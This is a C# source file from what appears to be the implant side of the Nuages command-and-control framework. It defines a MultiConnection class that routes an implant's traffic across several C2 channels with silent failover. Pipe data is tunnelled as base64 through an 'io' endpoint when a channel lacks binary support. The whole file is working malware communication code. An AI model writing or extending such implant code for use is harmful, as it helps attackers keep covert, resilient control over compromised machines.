using System;
using System.Collections.Generic;
using System.Json;

namespace NuagesSharpImplant.Connections
{
    class MultiConnection : NuagesC2Connection
    {
        List<NuagesC2Connection> connections;

        public int refreshrate;

        public int buffersize;

        public MultiConnection(List<NuagesC2Connection> connections, int buffersize, int refreshrate)
        {
            this.buffersize = buffersize;

            this.refreshrate = refreshrate;
            
            this.connections = connections;
            
        }

        public string POST(string url, string jsonContent) {

            string result;

            foreach (NuagesC2Connection connection in this.connections) {

                try
                {
                    result = connection.POST(url, jsonContent);

                    return result;
                }
                catch (Exception e) { }
            }

            throw new Exception("All connections failed");
        }

        public byte[] POST(string url, byte[] input)
        {

            byte[] result;

            foreach (NuagesC2Connection connection in this.connections)
            {

                try
                {

                    if (connection.supportsBinaryIO())
                    {
                        
                        result = connection.POST(url, input);

                        return result;
                    }
                    else
                    {
                        string[] temp = url.Split('/');
                        List<KeyValuePair<string, JsonValue>> list = new List<KeyValuePair<string, JsonValue>>();
                        list.Add(new KeyValuePair<string, JsonValue>("pipe_id", temp[1]));
                        list.Add(new KeyValuePair<string, JsonValue>("maxSize", temp[2]));
                        list.Add(new KeyValuePair<string, JsonValue>("in", Convert.ToBase64String(input)));
                        JsonObject body = new JsonObject(list);
                        JsonValue response = JsonValue.Parse(connection.POST("io", body.ToString()));
                        return Convert.FromBase64String(response["out"]);
                    }

                }
                catch (Exception e) { }
            }

            throw new Exception("All connections failed");
        }

        public string getConnectionString() {

            string connectionString = "";

            foreach (NuagesC2Connection connection in this.connections)
            {
                connectionString += "," + connection.getConnectionString();

            }
            return connectionString;

        }

        public string getHandler()
        {

            string handlers = "";

            foreach (NuagesC2Connection connection in this.connections)
            {
                handlers += "," + connection.getHandler();

            }
            return handlers;

        }

        public bool supportsBinaryIO()
        {

            foreach (NuagesC2Connection connection in this.connections)
            {
                if (connection.supportsBinaryIO())
                {
                    return true;
                }

            }

            return false;
        }

        public void setRefreshRate(int refreshrate)
        {

            this.refreshrate = refreshrate;

            foreach (NuagesC2Connection connection in this.connections)
            {
                connection.setRefreshRate(refreshrate);

            }
        }

        public void setBufferSize(int buffersize)
        {
            this.buffersize = buffersize;


            foreach (NuagesC2Connection connection in this.connections)
            {
                connection.setBufferSize(buffersize);

            }
        }

        public int getBufferSize()
        {
            return this.buffersize;
        }

        public int getRefreshRate()
        {
            return this.refreshrate;
        }

    }
}
